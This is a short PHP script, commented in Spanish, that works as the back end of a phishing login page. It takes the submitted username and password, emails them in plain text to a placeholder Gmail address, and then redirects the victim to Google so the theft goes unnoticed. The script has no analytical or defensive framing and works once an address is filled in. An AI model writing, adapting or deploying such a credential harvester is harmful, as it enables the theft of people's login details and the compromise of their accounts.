<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Dirección de correo a la que se enviarán los datos del formulario
    $destinatario = "tucorreo@gmail.com";

    // Asunto del correo
    $asunto = "Datos de inicio de sesión";

    // Contenido del correo
    $mensaje = "Usuario: " . $username . "\n" . "Contraseña: " . $password;

    // Cabeceras del correo
    $cabeceras = "From: tu_correo@gmail.com"; // Cambia esto por tu dirección de correo

    // Envía el correo electrónico
    mail($destinatario, $asunto, $mensaje, $cabeceras);
    
    // Redirige al usuario a la página de Google
    header("Location: https://www.google.com");
    exit();
}
?>
